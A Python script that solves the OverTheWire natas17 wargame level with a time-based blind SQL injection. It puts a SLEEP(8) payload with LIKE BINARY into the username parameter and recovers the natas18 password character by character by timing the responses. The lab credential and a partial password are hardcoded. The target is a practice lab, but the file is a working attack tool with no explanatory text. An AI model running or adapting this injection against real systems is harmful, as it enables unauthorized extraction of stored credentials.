import requests
import time

def time_get_page(query_dict, password):
	print('\tTrying password "{0}..."'.format(password))
	start = time.time()
	r = requests.get(
		"http://natas17.natas.labs.overthewire.org",
		auth= ("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"),
		params= query_dict)
	end = time.time()
	elapsed = end - start
	return elapsed

def get_password():
	possible_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
	password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh"
	index = 0
	while True:
		if len(password) == 32:
			return password
		password_times = {
			time_get_page({
				"username": 'natas18" AND password LIKE BINARY "{0}" AND SLEEP(8) #'.format("".join([password, char, '%']))
			}, "".join([password, char])): char
			for char in possible_chars
		}
		longest_time = max(password_times)
		password = "".join([password, password_times[longest_time]])
		print(longest_time)
		print('\nPassword: {0}\n'.format(password))


def main():
	print get_password()

if __name__ == "__main__":
	main()